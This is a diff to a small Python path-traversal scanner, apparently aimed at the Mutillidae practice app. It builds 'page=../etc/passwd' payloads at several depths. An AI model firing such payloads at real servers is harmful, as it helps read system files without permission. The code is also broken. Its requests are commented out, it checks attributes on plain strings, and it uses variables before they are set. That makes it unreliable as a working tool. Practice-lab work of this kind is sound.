@@ -51,8 +51,32 @@ def path_traversal(name):
 
     for line in f:
         if "page=" in line:
-            line.split()
-            print(line[:])
+            page = "page=".join(line.split("page=")[:-1])
+            print(page)
 
+            q1 = page+"page=../etc/passwd"
+            #request = urllib.urlopen(q1)
+            if q1.code != 200:
+                q2 = page + "page=../../etc/passwd"
+                # request = urllib.urlopen(q2)
+            else:
+                print("\033[01;31m[*] Path Traversal Found : " + q1 + "\033[00m\n")
+
+            if q2.code != 200:
+                q3 = page + "page=../../../etc/passwd"
+                # request = urllib.urlopen(q3)
+            else:
+                print("\033[01;31m[*] Path Traversal Found : " + q2 + "\033[00m\n")
+
+            if q3 != 200:
+                q4 = page + "page=../../../../etc/passwd"
+                # request = urllib.urlopen(q4)
+            else:
+                print("\033[01;31m[*] Path Traversal Found : " + q3 + "\033[00m\n")
+
+            if q4 != 200:
+                print("[-] Path Traversal Not Found :")
+            else:
+                print("\033[01;31m[*] Path Traversal Found : " + q3 + "\033[00m\n")
 
 path_traversal("MUTILLIDAE")
